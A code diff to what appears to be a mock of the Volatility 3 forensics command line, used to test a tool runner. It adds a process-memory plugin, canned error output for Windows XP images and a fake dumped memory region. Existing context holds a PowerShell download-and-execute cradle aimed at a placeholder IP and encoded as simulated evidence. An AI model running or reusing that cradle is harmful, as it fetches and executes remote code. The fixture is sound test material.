@@ -43,6 +43,8 @@ Plugins:
     windows.registry.printkey.PrintKey
                         Lists the registry keys under a hive or specific key
                         value.
+    windows.vadinfo.VadInfo
+                        Lists process memory ranges.
 
 The following plugins could not be loaded (use -vv to see why):
 volatility3.plugins.yarascan
@@ -63,7 +65,24 @@ OPTIONS = {  # copied from the real `vol <plugin> -h` of vol3 2.28.2
     "windows.registry.printkey.PrintKey": ["--offset OFFSET  Hive Offset",
                                            "--key KEY        Key to start from",
                                            "--recurse        Recurses through keys"],
+    "windows.vadinfo.VadInfo": ["--address ADDRESS  Process virtual memory address to include",
+                                "--pid [PID ...]    Filter on specific process IDs",
+                                "--dump             Extract listed memory ranges",
+                                "--maxsize MAXSIZE  Maximum size for dumped VAD sections"],
 }
+# Output of the real vol3 2.28.2 on a Windows XP SP2 image (Bob.vmem, 12/10/2026): the
+# "Unsatisfied requirement" text goes to stdout, the warnings to stderr.
+XP_STDOUT = """
+Unsatisfied requirement plugins.PsList.kernel.symbol_table_name:
+
+A symbol table requirement was not fulfilled.  Please verify that:
+    The associated translation layer requirement was fulfilled
+    You have the correct symbol file for the requirement
+"""
+XP_STDERR = """Volatility 3 Framework 2.28.2
+WARNING  volatility3.framework.plugins: Automagic exception occurred: ValueError: Symbol type not in symbol_table_name1 SymbolTable: _ETHREAD
+Unable to validate the plugin requirements: ['plugins.PsList.kernel.symbol_table_name']
+"""
 PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
 ENC = base64.b64encode(PAYLOAD.encode("utf-16-le")).decode()
 
@@ -134,6 +153,23 @@ def main() -> int:
                 print("  " + line)
         return 0
     pid = int(args[args.index("--pid") + 1]) if "--pid" in args else None
+    image = args[args.index("-f") + 1] if "-f" in args else ""
+    if image.rsplit("/", 1)[-1].startswith("xp"):  # an image vol3 cannot read
+        print(XP_STDOUT)
+        print(XP_STDERR, file=sys.stderr)
+        return 1
+    if plugin == "windows.vadinfo.VadInfo":
+        addr = int(args[args.index("--address") + 1]) if "--address" in args else None
+        rows = []
+        if pid == 4312 and addr is not None and 0x1F0000 <= addr <= 0x1F0FFF:
+            name = "pid.4312.vad.0x1f0000-0x1f0fff.dmp"
+            if "--dump" in args:
+                with open(args[args.index("-o") + 1] + "/" + name, "wb") as fh:
+                    fh.write(b"MZ" + b"\x90" * 4094)
+            rows = [{"PID": 4312, "Process": "powershell.exe", "Start VPN": 0x1F0000,
+                     "End VPN": 0x1F0FFF, "File output": name, "__children": []}]
+        print(json.dumps(rows))
+        return 0
     if plugin == "windows.cmdline.CmdLine" and pid == 9999:
         while True:  # endless output: exercises the runner output bound
             sys.stdout.write("x" * 65536)
